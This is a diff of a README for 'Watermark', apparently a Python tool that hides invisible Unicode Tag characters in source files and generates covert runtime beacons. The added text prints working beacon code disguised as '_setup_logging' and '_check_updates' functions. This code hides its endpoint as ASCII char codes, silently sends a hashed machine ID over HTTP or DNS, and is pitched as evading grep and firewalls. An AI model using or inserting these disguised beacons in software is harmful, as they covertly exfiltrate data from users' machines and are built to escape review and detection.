@@ -5,22 +5,20 @@
 
 ---
 
-**Watermark** embeds invisible ownership markers into Python source files using zero-width Unicode steganography, and optionally generates a silent runtime beacon that notifies you when stolen code is executed.
+**Watermark** embeds invisible ownership markers into Python source files using Unicode Tag character steganography, and optionally generates a silent runtime beacon that notifies you when stolen code is executed.
 
 ## Features
 
-- **Steganographic watermark** — zero-width Unicode characters (`U+200B`, `U+200C`, `U+200D`) hidden inside strings and comments. Invisible in every editor, terminal, and code hosting platform. Survives copy-paste.
+- **Steganographic watermark** — Unicode Tag characters (`U+E0020`, `U+E0021`, `U+E0001`) hidden across multiple locations in strings and comments. Invisible in every editor, terminal, and code hosting platform. Survives copy-paste. Spread across 3 injection points — removing one copy leaves the others intact.
 - **Ownership verification** — extract and verify the owner of any watermarked file.
-- **Runtime beacon** — a daemon thread that silently contacts your server when the watermarked code runs, sending a hashed machine ID.
-- **Stealth beacon** — endpoint URL split into base64 fragments and disguised as a profiling decorator. `grep`/`ripgrep` cannot find the URL in plain text.
+- **Runtime beacon (HTTP stealth)** — endpoint URL encoded as a list of ASCII char codes inside a function named `_setup_logging`. No URL string is present in the source; `grep`/`ripgrep` cannot find the endpoint.
+- **Runtime beacon (DNS)** — uses `socket.getaddrinfo()` to exfiltrate data via DNS queries. No HTTP, no `urllib`. Works through almost every firewall. Looks like a routine hostname lookup.
 - **Zero dependencies** — standard library only.
 
 ## Installation
 
-No package needed. Just copy `watermark.py` into your project or anywhere on your `PATH`.
-
 ```bash
-git clone https://github.com/<your-username>/watermark.git
+git clone https://github.com/juanucilla/watermark.git
 cd watermark
 python watermark.py --help
 ```
@@ -35,7 +33,7 @@ Python 3.10+ required.
 python watermark.py embed mysecret.py "alice" --out mysecret_marked.py
 # [+] Watermark embedded : 'owner:alice:2ae1c5b3'
 # [+] Written to         : mysecret_marked.py
-# [+] Hidden characters  : 186 (invisible)
+# [+] Hidden characters  : 372 across 3 locations (invisible)
 ```
 
 The output file looks **byte-for-byte identical** to the original in any editor.
@@ -59,92 +57,130 @@ Exit code `0` = verified, `1` = not found or mismatch — safe to use in CI scri
 
 ### Generate a runtime beacon
 
-```bash
-# Standard (URL in plain text)
-python watermark.py beacon https://myserver.com/w my-project
+**HTTP stealth** — endpoint stored as ASCII char codes inside a logging function:
 
-# Stealth (URL split into base64 fragments, wrapped in a decorator)
+```bash
 python watermark.py beacon https://myserver.com/w my-project --stealth
 ```
 
-Paste the output into your module's `__init__.py` or entry point, then decorate any public function:
-
+Output:
 ```python
-# paste beacon snippet here …
+import os as _os
 
-@_perf_track          # ← this is the hidden trigger
-def my_main_function():
-    ...
+def _setup_logging(level=0):
+    """Configure internal log level."""
+    import hashlib as _h, socket as _s, platform as _p, threading as _t
+    if _os.environ.get("_LOG_INIT"):
+        return
+    _os.environ["_LOG_INIT"] = "1"
+    def _flush():
+        try:
+            import urllib.request as _u
+            _uid = _h.md5((_s.gethostname() + _p.node()).encode()).hexdigest()[:8]
+            _ep = "".join(chr(c) for c in [104, 116, 116, 112, 115, ...])
+            _u.urlopen(_ep + "?p=my-project&u=" + _uid, timeout=2)
+        except Exception:
+            pass
+    _t.Thread(target=_flush, daemon=True).start()
+
+_setup_logging()
 ```
 
-When the decorated function is called for the first time, your server receives:
-
-```
-GET https://myserver.com/w?p=my-project&u=<md5_of_hostname>
-```
-
-The request runs in a daemon thread and silences all exceptions — it never affects the host application.
-
-### Inspect URL fragments (utility)
+**DNS exfiltration** — no HTTP at all, looks like a version check:
 
 ```bash
-python watermark.py encode https://myserver.com/w
-# Fragments:
-#   _F[0] = b'aHR0cHM6Ly9'
-#   _F[1] = b'0dW9zZXJ2ZX'
-#   _F[2] = b'IuY29tL3c='
+python watermark.py beacon beacon.myserver.com my-project --dns
 ```
+
+Output:
+```python
+import os as _os
+
+def _check_updates():
+    """Verify connectivity to update server."""
+    if _os.environ.get("_UPD_DONE"):
+        return
+    _os.environ["_UPD_DONE"] = "1"
+    try:
+        import socket as _s, hashlib as _h, platform as _p
+        _uid = _h.md5((_s.gethostname() + _p.node()).encode()).hexdigest()[:6]
+        _s.setdefaulttimeout(2)
+        _s.getaddrinfo(_uid + ".1c7cd944.beacon.myserver.com", 80)
+    except Exception:
+        pass
+
+_check_updates()
+```
+
+Your authoritative DNS server receives queries like `a3f8b2c1.1c7cd944.beacon.myserver.com` — log them to identify the machine running your code.
 
 ## How it works
 
-### Layer 1 — Zero-width steganography
+### Layer 1 — Unicode Tag steganography
 
-The owner ID and a SHA-256 fingerprint of the filename are encoded as a binary string, then mapped to zero-width characters:
+The owner ID and a SHA-256 fingerprint are encoded in binary, then mapped to Unicode Tag characters:
 
 ```
-bit 0 → U+200B (Zero Width Space)
-bit 1 → U+200C (Zero Width Non-Joiner)
-boundary → U+200D (Zero Width Joiner)
+U+E0020  Tag Space   → bit 0
+U+E0021  Tag !       → bit 1
+U+E0001  Language Tag → payload boundary
 ```
 
-The payload is injected immediately after the first string literal or comment found in the file. It is completely invisible when viewing the file, and most automated formatters (Black, isort) preserve it because it sits inside a string or comment.
+These characters sit in the Supplementary Special-purpose Plane (U+E0000 block). They are:
+- Invisible in all editors and terminals
+- Preserved through copy-paste and most code formatters
+- Spread across 3 injection points (beginning, middle, end of file) — removing one copy leaves the others intact
+- Far less commonly known as a steganography vector than the `U+200B/200C/200D` family
 
 ### Layer 2 — Runtime beacon
 
-The stealth beacon splits the endpoint URL into N base64 fragments stored as separate byte literals. They are reassembled in memory at call time. Neither `grep` nor IDE search can find the URL by scanning the source.
+**HTTP stealth**: the endpoint URL is stored as a Python list of ASCII integer values — e.g. `[104, 116, 116, 112, 115, ...]` — and reassembled with `"".join(chr(c) for c in [...])`. There is no URL string anywhere in the source; no `grep` pattern can find it.
 
-The beacon fires at most once per process (guarded by a module-level flag), uses a 2-second timeout, and catches all exceptions.
+**DNS**: the beacon encodes a hashed machine ID as a subdomain and resolves it via `socket.getaddrinfo()`. DNS queries reach your authoritative nameserver with no HTTP traffic at all.
 
 ## Setting up a server
 
-Any minimal HTTP endpoint works. Examples:
+### HTTP
 
-- **Testing:** [webhook.site](https://webhook.site) — free, instant, no setup.
-- **Production:** a single serverless function (Vercel, AWS Lambda, Cloudflare Worker) that logs `?p=` and `?u=` to a database.
-
-Minimal Python server (Flask):
+Any minimal HTTP endpoint works:
 
 ```python
+# Flask example
 from flask import Flask, request
 app = Flask(__name__)
 
 @app.route("/w")
 def beacon():
-    project = request.args.get("p")
-    uid = request.args.get("u")
-    print(f"[BEACON] project={project} machine={uid}")
+    print(f"[BEACON] project={request.args.get('p')} machine={request.args.get('u')}")
     return "", 204
 ```
+
+For testing without a server: [canarytokens.org](https://canarytokens.org) provides free HTTP and DNS tokens that alert you by email.
+
+### DNS
+
+You need an authoritative DNS server for your domain. Options:
+
+- **PowerDNS** with a pipe backend — log all queries to your subdomain
+- **canarytokens.org DNS token** — free, alerts by email when queried
+- **interactsh** (`github.com/projectdiscovery/interactsh`) — self-hosted DNS/HTTP listener
+
+## Comparison
+
+| Technique | Detectable with `grep` | Detectable with hexdump | Survives reformatting | Works offline |
+|---|---|---|---|---|
+| Steganographic (Tag chars) | No | Requires knowing U+E0000 plane | Usually | ✅ (proves ownership) |
+| Beacon HTTP stealth | No (URL is char codes) | No | N/A | ❌ |
+| Beacon DNS | No | No | N/A | ❌ |
 
 ## Limitations
 
 | Scenario | Steganographic watermark | Runtime beacon |
 |---|---|---|
 | Source code stolen and redistributed | ✅ Proves ownership | ✅ Fires on execution |
-| Code compiled to `.pyc` only | ✅ Survives (`.pyc` embeds string data) | ✅ Survives |
-| Code heavily refactored / rewritten | ❌ May be lost | Depends on placement |
-| Attacker strips all comments and strings | ❌ Lost | Depends on placement |
-| No internet access on target machine | ✅ Still proves ownership | ❌ Beacon cannot reach server |
+| Code compiled to `.pyc` only | ✅ Survives | ✅ Survives |
+| Code heavily refactored | ❌ May be lost | Depends on placement |
+| No internet access on target machine | ✅ Still proves ownership | ❌ Cannot reach server |
 
 ## Contributing
 
